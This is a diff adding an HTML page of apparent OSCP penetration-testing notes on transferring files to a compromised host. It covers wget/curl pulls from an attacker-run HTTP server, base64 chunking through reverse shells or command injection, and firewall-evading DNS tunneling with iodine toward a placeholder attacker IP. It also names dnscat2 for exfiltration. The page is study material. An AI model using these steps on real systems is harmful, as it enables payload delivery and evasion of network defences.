+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methods-for-transferring-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Methods for Transferring Files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-using-wget-and-curl" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Using wget and cURL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-using-scp-secure-copy" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Using scp (Secure Copy)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-using-base64-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Using base64 Encoding
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-2-use-a-text-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: Use a Text File
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-1-manual-typing-for-small-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 1: Manual Typing (For Small Files)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-2-break-the-base64-string-into-chunks-more-practical" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: Break the Base64 String into Chunks (More Practical)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-3-command-injection-or-reverse-shell-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 3: Command Injection or Reverse Shell Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#method-4-using-dns-or-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 4: Using DNS or HTTP Tunneling
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Tunneling
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#steps-for-dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Steps for DNS Tunneling:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-for-dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for DNS Tunneling:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-set-up-dns-tunneling-on-your-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Set up DNS Tunneling on Your (Attacker) Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-install-iodine-on-the-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1 Install Iodine on the Attacker Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-configure-dns-for-your-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2 Configure DNS for Your Domain
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13-start-the-iodine-server-on-your-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 Start the Iodine Server on Your Attacker Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-set-up-dns-tunneling-on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Set up DNS Tunneling on the Target Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-install-iodine-on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 Install Iodine on the Target Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-start-the-iodine-client-on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 Start the Iodine Client on the Target Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-verify-connection" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3 Verify Connection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-transfer-files-over-the-dns-tunnel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Transfer Files Over the DNS Tunnel
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31-on-the-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 On the Attacker Machine
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-validate-file-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Validate File Transfer
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#on-the-attacker-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      On the Attacker Machine:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#on-the-target-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      On the Target Machine:
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-for-dns-tunneling_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for DNS Tunneling
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-tunneling-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS Tunneling Windows
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DNS Tunneling Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-dns-tunneling-on-a-windows-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step-by-Step: DNS Tunneling on a Windows Target
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-1-use-a-windows-client-for-dns-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Use a Windows Client for DNS Tunneling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-download-and-set-up-iodine-on-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Download and Set Up Iodine on Windows
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-establish-the-dns-tunnel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Establish the DNS Tunnel
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-transfer-files-over-the-dns-tunnel" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Transfer Files Over the DNS Tunnel
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#option-1-transfer-files-using-netcat-nc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Option 1: Transfer Files Using Netcat (nc)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#option-2-transfer-files-using-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Option 2: Transfer Files Using PowerShell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-validate-file-transfer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Validate File Transfer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#summary_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Tunneling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#steps-for-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Steps for HTTP Tunneling:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools-for-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tools for HTTP Tunneling:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#when-to-use-dns-or-http-tunneling" class="md-nav__link">
+    <span class="md-ellipsis">
+      When to Use DNS or HTTP Tunneling
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#study-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Study Tips
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#study-tip" class="md-nav__link">
+    <span class="md-ellipsis">
+      Study Tip
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#validating-file-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Validating File Transfers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-using-the-file-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Using the file Command:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-using-md5sum" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Using md5sum:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#study-tips_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Study Tips
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://example.com/tutorial">Example Tutorial</a></li>
+<li><a href="https://documentation.oscp.org/exploitations">OSCP Exploit Documentation</a></li>
+</ul>
+<h3 id="overview"><strong>Overview</strong></h3>
+<p>During penetration testing, transferring files such as enumeration scripts, exploits, or other data between an attack machine and a remote server is common. Here, we'll explore different methods for securely and efficiently transferring files when you have code execution or SSH access to a remote host.</p>
+<hr />
+<h3 id="methods-for-transferring-files"><strong>Methods for Transferring Files</strong></h3>
+<h3 id="1-using-wget-and-curl">1. <strong>Using <code>wget</code> and <code>cURL</code></strong></h3>
+<p><strong>Scenario</strong>: You have command-line access to the remote host, and the host can reach your machine via network.</p>
+<ul>
+<li>
+<p><strong>Python HTTP Server Setup on Attacker’s Machine</strong>: Run a simple Python HTTP server to serve files from your directory.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">cd</span><span class="w"> </span>/path/to/your/file
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<p>This starts serving files from the directory on <code>http://your_ip:8000/</code>.</p>
+</li>
+<li>
+<p><strong>Download on the Remote Host (with <code>wget</code>)</strong>: On the remote machine, download the file using:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>wget<span class="w"> </span>http://your_ip:8000/filename.sh
+</code></pre></div>
+</li>
+<li>
+<p><strong>Alternative Download (with <code>cURL</code>)</strong>: If <code>wget</code> is not available, use <code>cURL</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>curl<span class="w"> </span>http://your_ip:8000/filename.sh<span class="w"> </span>-o<span class="w"> </span>filename.sh
+</code></pre></div>
+</li>
+</ul>
+<hr />
+<h3 id="2-using-scp-secure-copy">2. <strong>Using <code>scp</code> (Secure Copy)</strong></h3>
+<p><strong>Scenario</strong>: You have SSH credentials for the remote host.</p>
+<ul>
+<li>
+<p>Transfer a file to the remote machine using <code>scp</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>scp<span class="w"> </span>filename.sh<span class="w"> </span>user@remotehost:/path/to/save/
+</code></pre></div>
+</li>
+<li>
+<p>You will be prompted for the SSH password if not using key-based authentication.</p>
+</li>
+</ul>
+<hr />
+<h3 id="3-using-base64-encoding">3. <strong>Using <code>base64</code> Encoding</strong></h3>
+<p><strong>Scenario</strong>: Direct file transfers are blocked by firewalls, so you use a copy-paste method with base64 encoding.</p>
+<ul>
+<li>
+<p><strong>Encode the File (Attacker’s Machine)</strong>: Convert the file to a base64 string to avoid firewall issues.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>base64<span class="w"> </span>filename<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span>
+</code></pre></div>
+</li>
+<li>
+<p>Encode the file using <code>base64</code> and generate a single-line string with the <code>-w 0</code> option to avoid line breaks:</p>
+</li>
+<li>
+<p><strong>Decode the File (Remote Host)</strong>: Copy the base64 string to the remote host, decode it, and save the result to a file.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;base64_string&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>output_file
+</code></pre></div>
+<h3 id="method-2-use-a-text-file"><strong>Method 2: Use a Text File</strong></h3>
+<ol>
+<li>
+<p><strong>On the Attacker Machine</strong>:</p>
+<p>Encode the file and save the base64 output to a text file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>base64<span class="w"> </span>filename<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span>base64_encoded.txt
+</code></pre></div>
+</li>
+<li>
+<p><strong>Transfer the Text File</strong>:</p>
+<p>Use any of the regular file transfer methods (like <code>scp</code>, <code>wget</code>, or <code>curl</code>) to transfer the <code>base64_encoded.txt</code> file to the target machine.</p>
+</li>
+<li>
+<p><strong>On the Target Machine</strong>:</p>
+<p>Decode the file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>cat<span class="w"> </span>base64_encoded.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>output_filename
+</code></pre></div>
+</li>
+<li>
+<p><strong>Verify the Transfer</strong>:</p>
+<p>Again, verify using <code>file</code> or <code>md5sum</code> to confirm successful transfer.</p>
+</li>
+</ol>
+<p>This process is useful when you can't directly transfer files due to firewall or other restrictions, but you still have a way to copy-paste text or transfer a text file to the target machine.</p>
+<p>If you're unable to use <strong>copy-paste</strong> between your attacker machine and the target machine, and <strong>file transfer methods are blocked by a firewall</strong>, you can use <strong>interactive manual typing</strong> or <strong>split the base64 string</strong> into smaller parts. Here are alternative methods:</p>
+<h3 id="method-1-manual-typing-for-small-files"><strong>Method 1: Manual Typing (For Small Files)</strong></h3>
+<p>If the file you're trying to transfer is small (or you have no other options), you could manually type the base64-encoded string into the target machine. However, this is tedious and prone to errors, so it's not ideal for larger files.</p>
+<h3 id="method-2-break-the-base64-string-into-chunks-more-practical"><strong>Method 2: Break the Base64 String into Chunks (More Practical)</strong></h3>
+<p>If you can't copy and paste the entire base64 string but have SSH or remote command execution, you can break the base64 string into smaller, manageable chunks and manually transfer each chunk to the target machine. You can then reassemble the file on the target.</p>
+<ol>
+<li>
+<p><strong>On the Attacker Machine:</strong></p>
+<ul>
+<li>
+<p>Encode the file and split it into smaller chunks:This will create multiple chunk files (e.g., <code>base64_chunk_aa</code>, <code>base64_chunk_ab</code>, <code>base64_chunk_ac</code>, etc.), each containing part of the base64-encoded string. The <code>b 1000</code> flag specifies the chunk size (1000 bytes per file).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>base64<span class="w"> </span>filename<span class="w"> </span><span class="p">|</span><span class="w"> </span>split<span class="w"> </span>-b<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-<span class="w"> </span>base64_chunk_
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>On the Target Machine:</strong></p>
+<ul>
+<li>
+<p><strong>Manually type each chunk</strong> or send each chunk individually through the available remote access method:</p>
+<ul>
+<li>
+<p>First, start an empty file to store the reassembled base64 string:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>touch<span class="w"> </span>assembled_base64.txt
+</code></pre></div>
+</li>
+<li>
+<p>Append each chunk one by one. You can manually type the content of each chunk into the file (or send it via SSH if possible):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;base64_chunk_aa_content_here&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>assembled_base64.txt
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;base64_chunk_ab_content_here&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>assembled_base64.txt
+</code></pre></div>
+<p>(Continue until all chunks are added to <code>assembled_base64.txt</code>.)</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Decode the Reassembled Base64 File:</strong></p>
+<ul>
+<li>
+<p>Once all chunks are added to <code>assembled_base64.txt</code>, decode the base64 string into the original file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>cat<span class="w"> </span>assembled_base64.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>output_filename
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the Transfer:</strong></p>
+<ul>
+<li>
+<p>Verify that the file was transferred successfully using:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>file<span class="w"> </span>output_filename
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>md5sum<span class="w"> </span>output_filename
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="method-3-command-injection-or-reverse-shell-exploit"><strong>Method 3: Command Injection or Reverse Shell Exploit</strong></h3>
+<p>If you have a <strong>limited reverse shell</strong> or <strong>command injection vulnerability</strong> on the target, you could transfer chunks of the base64 string by executing commands directly on the remote machine:</p>
+<ol>
+<li>
+<p><strong>On the Attacker Machine:</strong></p>
+<ul>
+<li>
+<p>Encode the file and split the base64 string into small parts, as shown in Method 2.</p>
+<ol>
+<li><strong>On the Target Machine (via Shell or Command Injection):</strong></li>
+</ol>
+</li>
+<li>
+<p>Run commands to append each chunk into a file on the target machine:Continue until all chunks are transferred.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;base64_chunk_aa_content_here&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/assembled_base64.txt
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;base64_chunk_ab_content_here&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/assembled_base64.txt
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Decode the File:</strong> After all chunks have been sent, decode the base64 string:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>cat<span class="w"> </span>/tmp/assembled_base64.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>output_filename
+</code></pre></div>
+</li>
+</ol>
+<h3 id="method-4-using-dns-or-http-tunneling"><strong>Method 4: Using DNS or HTTP Tunneling</strong></h3>
+<p>If direct file transfer is blocked but you can make outbound DNS or HTTP requests, you could use a <strong>DNS exfiltration</strong> or <strong>HTTP tunneling</strong> tool to transfer data in smaller chunks. This is more advanced but can bypass some firewall restrictions.</p>
+<p>When traditional file transfer methods like <code>wget</code>, <code>scp</code>, or even manual copy-pasting aren't working due to firewalls or network restrictions, <strong>DNS or HTTP tunneling</strong> can be used to bypass these restrictions. These methods work by encapsulating your data in seemingly normal DNS or HTTP requests, which are typically allowed through firewalls.</p>
+<p>Here's how you can achieve file transfer via DNS or HTTP tunneling:</p>
+<hr />
+<h3 id="dns-tunneling"><strong>DNS Tunneling</strong></h3>
+<p>DNS tunneling uses the DNS protocol to send data across a network by encoding it into DNS queries and responses. This technique can be used to bypass firewalls that don't block DNS traffic.</p>
+<h3 id="steps-for-dns-tunneling"><strong>Steps for DNS Tunneling:</strong></h3>
+<ol>
+<li>
+<p><strong>Set up a DNS tunneling server on the attacker machine:</strong> You need a tool like <strong>Iodine</strong> or <strong>Dnscat2</strong> to set up a DNS tunnel server. These tools encode data in DNS queries that the client sends to the server.</p>
+<p><strong>Example using Iodine:</strong></p>
+<ul>
+<li>
+<p>On the attacker machine (the DNS server):</p>
+<p>```bash
+           sudo apt-get install iodine
+sudo iodined -f 10.0.0.1 example.com</p>
+<p>```</p>
+<p>Replace <code>example.com</code> with your registered domain that you control. You must configure your DNS to point to the attacker's server.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Set up the DNS tunneling client on the target machine:</strong></p>
+<ul>
+<li>
+<p>If you can execute commands on the target machine, you can use <strong>Iodine</strong> as a client to connect back to your server:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>iodine
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>sudo<span class="w"> </span>iodine<span class="w"> </span>-f<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>example.com
+</code></pre></div>
+<p>This creates a virtual network interface on the target that allows data to flow through the DNS tunnel.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Transfer files through the DNS tunnel:</strong></p>
+<ul>
+<li>Once the tunnel is established, you can use standard file transfer protocols like <code>scp</code>, <code>wget</code>, or <code>curl</code> over this DNS tunnel.</li>
+</ul>
+<p>You can also tunnel a command shell or other traffic through this interface.</p>
+</li>
+</ol>
+<h3 id="tools-for-dns-tunneling"><strong>Tools for DNS Tunneling:</strong></h3>
+<ul>
+<li><strong>Iodine</strong>: A tool for setting up DNS tunneling over a virtual network interface.</li>
+<li><strong>dnscat2</strong>: A tool specifically designed for exfiltrating data using DNS queries.</li>
+</ul>
+<h3 id="scenario"><strong>Scenario</strong></h3>
+<p>You have access to the target machine, but traditional file transfer methods (like <code>scp</code>, <code>wget</code>, or <code>curl</code>) are blocked due to a firewall. However, the firewall allows DNS traffic. You want to use DNS tunneling to transfer files from your attacker machine (your local machine) to the target machine by encapsulating data in DNS queries.</p>
+<hr />
+<h3 id="step-1-set-up-dns-tunneling-on-your-attacker-machine"><strong>Step 1: Set up DNS Tunneling on Your (Attacker) Machine</strong></h3>
+<h3 id="11-install-iodine-on-the-attacker-machine"><strong>1.1 Install Iodine on the Attacker Machine</strong></h3>
+<p>First, ensure that Iodine is installed on your local machine (the attacker).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>iodine
+</code></pre></div>
+<h3 id="12-configure-dns-for-your-domain"><strong>1.2 Configure DNS for Your Domain</strong></h3>
+<ul>
+<li>You need a domain name that you control (e.g., <code>example.com</code>).</li>
+<li>Create a DNS <code>A</code> record for your domain pointing to your attacker machine’s public IP (e.g., <code>123.45.67.89</code>).</li>
+<li>This will allow DNS requests to reach your server.</li>
+</ul>
+<p>Example:</p>
+<ul>
+<li>Domain: <code>example.com</code></li>
+<li>Subdomain for tunneling: <code>tunnel.example.com</code> → points to <code>123.45.67.89</code></li>
+</ul>
+<h3 id="13-start-the-iodine-server-on-your-attacker-machine"><strong>1.3 Start the Iodine Server on Your Attacker Machine</strong></h3>
+<p>Run the following command to start the DNS tunneling server. Assign an internal IP (like <code>10.0.0.1</code>) to the virtual network interface.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sudo<span class="w"> </span>iodined<span class="w"> </span>-f<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>tunnel.example.com
+</code></pre></div>
+<p>Here:</p>
+<ul>
+<li><code>f</code> makes Iodine run in the foreground (you can omit this if you want it to run in the background).</li>
+<li><code>10.0.0.1</code> is the IP address assigned to the virtual interface on the DNS tunnel.</li>
+<li><code>tunnel.example.com</code> is the subdomain you set up for tunneling.</li>
+</ul>
+<p>After running the command, you should see output indicating the Iodine server is running, similar to this:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Opened<span class="w"> </span>dns0
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Sending<span class="w"> </span>fake<span class="w"> </span>version:<span class="w"> </span>Iodine<span class="w"> </span><span class="m">0</span>.7.0
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>Setting<span class="w"> </span>IP<span class="w"> </span>of<span class="w"> </span>dns0<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.0.0.1
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>Ready,<span class="w"> </span>tunnel.example.com<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span>and<span class="w"> </span>running.
+</code></pre></div>
+<hr />
+<h3 id="step-2-set-up-dns-tunneling-on-the-target-machine"><strong>Step 2: Set up DNS Tunneling on the Target Machine</strong></h3>
+<p>Now that the DNS tunnel server is running on your attacker machine, you need to configure the target machine to connect to it via DNS tunneling.</p>
+<h3 id="21-install-iodine-on-the-target-machine"><strong>2.1 Install Iodine on the Target Machine</strong></h3>
+<p>If Iodine is not already installed on the target machine, and you have enough privileges, install it:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>iodine
+</code></pre></div>
+<h3 id="22-start-the-iodine-client-on-the-target-machine"><strong>2.2 Start the Iodine Client on the Target Machine</strong></h3>
+<p>Run the following command on the target machine to connect to your DNS tunneling server:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>sudo<span class="w"> </span>iodine<span class="w"> </span>-f<span class="w"> </span><span class="m">123</span>.45.67.89<span class="w"> </span>tunnel.example.com
+</code></pre></div>
+<p>Here:</p>
+<ul>
+<li><code>123.45.67.89</code> is the public IP address of your attacker machine where the DNS tunneling server is running.</li>
+<li><code>tunnel.example.com</code> is the subdomain you set up for DNS tunneling.</li>
+</ul>
+<p>This will initiate a connection to the DNS tunneling server on your attacker machine, creating a virtual network interface on the target machine.</p>
+<h3 id="23-verify-connection"><strong>2.3 Verify Connection</strong></h3>
+<p>Once the connection is established, a virtual network interface (like <code>dns0</code>) should be created on the target machine. This interface will have an internal IP, such as <code>10.0.0.2</code>.</p>
+<p>Run the following command on the target machine to verify the virtual interface and IP address:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>bash
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>ifconfig<span class="w"> </span>dns0
+</code></pre></div>
+<p>The output should show something like:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>dns0<span class="w">      </span>Link<span class="w"> </span>encap:UNSPEC<span class="w">  </span>HWaddr<span class="w"> </span>...
